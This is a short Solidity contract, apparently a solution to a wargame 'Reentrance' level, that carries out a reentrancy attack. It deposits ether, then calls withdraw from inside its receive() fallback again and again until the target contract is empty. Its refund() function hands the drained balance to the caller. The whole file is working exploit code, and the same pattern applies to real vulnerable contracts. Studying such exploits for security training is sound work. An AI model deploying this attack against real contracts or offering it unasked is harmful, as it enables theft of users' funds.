pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract ReentrancyAttackV2 {
    Reentrance public reentrance;

    constructor(address reentranceAddress) public {
        reentrance = Reentrance(reentranceAddress);
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance > 0) {
            reentrance.withdraw(targetBalance);
        }
    }

    function refund() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}